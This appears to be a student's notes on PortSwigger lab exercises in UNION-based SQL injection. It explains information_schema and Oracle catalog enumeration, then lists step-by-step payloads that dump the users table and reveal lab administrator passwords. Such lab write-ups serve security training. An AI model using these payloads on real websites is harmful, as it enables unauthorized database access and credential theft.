---
tags: ["information gathering", "sqli"]
image: "img/Portswigger/sql-injection.png"
---

==> Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

-->You can query information_schema.tables to list the tables in the database:

SELECT \* FROM information_schema.tables

This returns output like the following:

```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
================================================
MyDatabase    dbo          Products   BASE TABLE
MyDatabase    dbo          Users      BASE TABLE
MyDatabase    dbo          Feedback   BASE TABLE
________________________________________________
```

This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables:

SELECT \* FROM information_schema.columns WHERE table_name = 'Users'

This returns output like the following:

```sql

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
=================================================================
MyDatabase    dbo          Users      UserId      int
MyDatabase    dbo          Users      Username    varchar
MyDatabase    dbo          Users      Password    varchar
```

This output shows the columns in the specified table and the data type of each column.

================================================================

## challenge

-> first check the number of tables using : `'+UNION+SELECT+"abc","def"-`-
-> after that check the table names using this payload : `'+UNION+SELECT+table_name, NULL+FROM+information_schema.tables--`
-> see the number of the columns using command : `'+UNION+SELECT+column_name, NULL+FROM+information_schema.columns+WHERE+table_name="users_zlvypg"--`

-> found 2 columns : 1)username_fuoiaa 2)password_jwsqrn
-> let's see the content of the tables : `'+UNION+SELECT+username_fuoiaa,password_jwsqrn+FROM+users_zlvypg--`

-> found the administrator password:

```bash
administrator:ffgwc2jemb2hq113pi87
```

## Equivalent to information schema on Oracle

--> On Oracle, you can obtain the same information with slightly different queries.

You can list tables by querying all_tables:

SELECT \* FROM all_tables

And you can list columns by querying all_tab_columns:

SELECT \* FROM all_tab_columns WHERE table_name = 'USERS'

## Challenge

-> In oracle,there is a table called `dual` so we can use it for finding the number of columns

-> first of all find the number of columns : `'+UNION+SELECT+'abc','def'+FROM+dual--`
-> we got response so Let's use this payload : `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`

-> found one table : `USERS_WYZASZ`
-> Let's read the data of that table : `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_WYZASZ'--`

-> got 2 tables : 1)PASSWORD_BIASBO 2)USERNAME_HMHMIU
-> Let's read the content of this 2 columns : `'+UNION+SELECT+PASSWORD_BIASBO,USERNAME_HMHMIU+FROM+USERS_WYZASZ--`

-> got the password of administrator :

```bash
administrator:gjqdv2xrnw5kynwhizpo
```
